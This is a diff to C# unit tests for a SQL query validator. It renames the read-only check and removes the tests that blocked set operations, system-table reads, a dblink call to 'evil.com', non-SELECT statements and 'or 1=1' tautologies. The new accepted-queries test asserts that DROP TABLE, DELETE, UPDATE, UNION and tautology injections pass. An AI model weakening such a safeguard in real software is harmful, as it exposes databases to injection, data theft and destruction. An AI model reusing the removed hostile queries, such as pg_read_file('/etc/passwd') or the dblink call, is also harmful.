@@ -24,9 +24,17 @@ public class SqlQueryValidatorTests
     [InlineData("SELECT preset FROM config")]
     [InlineData("SELECT * FROM intersections")]
     [InlineData("SELECT * FROM exceptions")]
-    public void EnsureReadOnlySelect_WithSafeQueries_ShouldNotThrow(string query)
+    [InlineData("SELECT 'drop table' AS msg FROM users")]
+    [InlineData("SELECT * FROM users WHERE note = 'pg_sleep is bad'")]
+    [InlineData("SELECT 1 UNION SELECT 2")]
+    [InlineData("SELECT * FROM users WHERE id = 1 or 1=1")]
+    [InlineData("INSERT INTO users VALUES (1)")]
+    [InlineData("UPDATE users SET name = 'x'")]
+    [InlineData("DELETE FROM users WHERE id = 1")]
+    [InlineData("DROP TABLE users")]
+    public void ValidateQuery_WithAcceptedQueries_ShouldNotThrow(string query)
     {
-        SqlQueryValidator.EnsureReadOnlySelect(query);
+        SqlQueryValidator.ValidateQuery(query);
     }
 
     [Theory]
@@ -34,56 +42,18 @@ public class SqlQueryValidatorTests
     [InlineData("SELECT 1 /* block comment */")]
     [InlineData("SELECT 'foo\\' /* ' FROM pg_shadow --'")]  // backslash does not escape quotes in standard strings
     [InlineData("SELECT * FROM users WHERE name = 'it\\'s a test -- ok'")]  // \' is not an escape in standard SQL
-    public void EnsureReadOnlySelect_WithComments_ShouldThrow(string query)
+    public void ValidateQuery_WithComments_ShouldThrow(string query)
     {
-        var exception = Assert.Throws<CommandValidationException>(() => SqlQueryValidator.EnsureReadOnlySelect(query));
+        var exception = Assert.Throws<CommandValidationException>(() => SqlQueryValidator.ValidateQuery(query));
         Assert.Contains("Comments are not allowed", exception.Message);
-    }
-
-    [Theory]
-    [InlineData("SELECT 1 UNION SELECT usename FROM users")]
-    [InlineData("SELECT 1 UNION ALL SELECT 2")]
-    [InlineData("SELECT 1 INTERSECT SELECT 2")]
-    [InlineData("SELECT 1 EXCEPT SELECT 2")]
-    [InlineData("SELECT 1 union select 2")]
-    public void EnsureReadOnlySelect_WithSetOperations_ShouldThrow(string query)
-    {
-        var exception = Assert.Throws<CommandValidationException>(() => SqlQueryValidator.EnsureReadOnlySelect(query));
-        Assert.Contains("dangerous keyword", exception.Message);
-    }
-
-    [Theory]
-    [InlineData("SELECT pg_read_file('/etc/passwd')")]
-    [InlineData("SELECT * FROM pg_shadow")]
-    [InlineData("SELECT usename, passwd FROM pg_user")]
-    [InlineData("SELECT rolname, rolsuper, rolcanlogin FROM pg_roles")]
-    [InlineData("SELECT dblink('host=evil.com', 'SELECT 1')")]
-    [InlineData("SELECT pg_sleep(999)")]
-    [InlineData("SELECT * FROM pg_stat_ssl")]
-    [InlineData("SELECT * FROM generate_series(1,1000000000)")]
-    public void EnsureReadOnlySelect_WithDangerousIdentifiers_ShouldThrow(string query)
-    {
-        var exception = Assert.Throws<CommandValidationException>(() => SqlQueryValidator.EnsureReadOnlySelect(query));
-        Assert.Contains("is not allowed", exception.Message);
-    }
-
-    [Theory]
-    [InlineData("DROP TABLE users")]
-    [InlineData("DELETE FROM users")]
-    [InlineData("INSERT INTO users VALUES (1)")]
-    [InlineData("UPDATE users SET name = 'x'")]
-    public void EnsureReadOnlySelect_WithNonSelectStatements_ShouldThrow(string query)
-    {
-        var exception = Assert.Throws<CommandValidationException>(() => SqlQueryValidator.EnsureReadOnlySelect(query));
-        Assert.Contains("Only single read-only SELECT statements are allowed", exception.Message);
     }
 
     [Theory]
     [InlineData("SELECT * FROM users; DROP TABLE users")]
     [InlineData("SELECT * FROM users; SELECT * FROM products")]
-    public void EnsureReadOnlySelect_WithMultipleStatements_ShouldThrow(string query)
+    public void ValidateQuery_WithMultipleStatements_ShouldThrow(string query)
     {
-        var exception = Assert.Throws<CommandValidationException>(() => SqlQueryValidator.EnsureReadOnlySelect(query));
+        var exception = Assert.Throws<CommandValidationException>(() => SqlQueryValidator.ValidateQuery(query));
         Assert.Contains("Multiple or stacked SQL statements are not allowed", exception.Message);
     }
 
@@ -91,27 +61,18 @@ public class SqlQueryValidatorTests
     [InlineData("")]
     [InlineData("   ")]
     [InlineData(null)]
-    public void EnsureReadOnlySelect_WithEmptyOrNullQuery_ShouldThrow(string? query)
+    public void ValidateQuery_WithEmptyOrNullQuery_ShouldThrow(string? query)
     {
-        var exception = Assert.Throws<CommandValidationException>(() => SqlQueryValidator.EnsureReadOnlySelect(query));
+        var exception = Assert.Throws<CommandValidationException>(() => SqlQueryValidator.ValidateQuery(query));
         Assert.Contains("Query cannot be empty", exception.Message);
     }
 
     [Fact]
-    public void EnsureReadOnlySelect_WithLongQuery_ShouldThrow()
+    public void ValidateQuery_WithLongQuery_ShouldThrow()
     {
         var longQuery = "SELECT * FROM users WHERE " + new string('X', 5001);
 
-        var exception = Assert.Throws<CommandValidationException>(() => SqlQueryValidator.EnsureReadOnlySelect(longQuery));
+        var exception = Assert.Throws<CommandValidationException>(() => SqlQueryValidator.ValidateQuery(longQuery));
         Assert.Contains("Query length exceeds limit", exception.Message);
-    }
-
-    [Theory]
-    [InlineData("SELECT * FROM users WHERE id = 1 or 1=1")]
-    [InlineData("SELECT * FROM users WHERE id = 1 or '1'='1")]
-    public void EnsureReadOnlySelect_WithTautologyPatterns_ShouldThrow(string query)
-    {
-        var exception = Assert.Throws<CommandValidationException>(() => SqlQueryValidator.EnsureReadOnlySelect(query));
-        Assert.Contains("tautology", exception.Message);
     }
 }
